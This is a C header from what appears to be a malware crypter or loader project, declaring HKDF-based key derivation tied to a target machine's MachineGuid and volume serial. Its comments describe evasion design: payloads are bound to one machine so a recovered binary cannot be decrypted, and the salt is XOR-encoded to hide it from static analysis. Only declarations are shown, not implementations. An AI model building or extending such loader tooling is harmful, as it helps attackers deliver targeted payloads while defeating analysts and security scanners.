/*
 * keyderive.h -- per-execution AES/MAC key derivation (F9)
 *
 * Replaces the static AES key / MAC key with runtime-derived keys produced
 * from a machine fingerprint (MachineGuid + C: volume serial) and an
 * embedded salt via HKDF-SHA256. One binary carries no static key; a
 * recovered binary cannot decrypt payloads built for a different machine.
 */
#ifndef KEYDERIVE_H
#define KEYDERIVE_H

#include <stdint.h>
#include <stddef.h>

/* Derive a 32-byte AES key and 32-byte HMAC key from a machine fingerprint
 * (MachineGuid + C: volume serial) and an embedded salt, using HKDF-SHA256.
 * The keys are written into the caller's buffers (32 bytes each).
 * Returns 0 on success, non-zero on failure. The fingerprint material and
 * intermediate HKDF state are wiped before return. */
int keyderive_derive(uint8_t aes_key[32], uint8_t mac_key[32]);

/* Reconstruct the same fingerprint the loader would use, given the target's
 * MachineGuid string and C: volume serial (DWORD). Writes a 64-byte
 * fingerprint into out. Used by encode2aes to derive keys for a known target.
 * This runs on Linux too (pure computation), so it must NOT call any
 * Windows API -- it just assembles the bytes. */
void keyderive_fingerprint_from(const char *machine_guid, uint32_t vol_serial,
                                uint8_t out[64]);

/* HKDF-SHA256 over a 64-byte fingerprint + embedded salt, producing two
 * 32-byte keys. Pure computation (Linux-portable). */
void keyderive_hkdf(const uint8_t *ikm, size_t ikm_len,
                     const uint8_t *salt, size_t salt_len,
                     uint8_t aes_key[32], uint8_t mac_key[32]);

/* P3: the salt is XOR-encoded in the binary; decode it into the caller's
 * 16-byte buffer on demand. This is the single source of truth for the salt
 * — the raw bytes are NOT a static constant in .rdata. */
void keyderive_get_salt(uint8_t out[16]);
#define KD_SALT_LEN 16

/* Derive the AES + MAC keys from a pre-assembled 64-byte fingerprint using the
 * embedded salt (and, when DARKCRYPT_BUILD_ID is defined at build time, the
 * 16-byte BUILD_ID mixed into the salt — R8 per-build salt). This is the
 * shared derivation path used by both the loader (keyderive_derive) and the
 * encoder (--derive mode), so the salt is never duplicated.
 * Pure computation (Linux-portable): aes_key/mac_key get 32 bytes each. */
void keyderive_derive_from_fingerprint(const uint8_t fingerprint[64],
                                       uint8_t aes_key[32],
                                       uint8_t mac_key[32]);

#endif /* KEYDERIVE_H */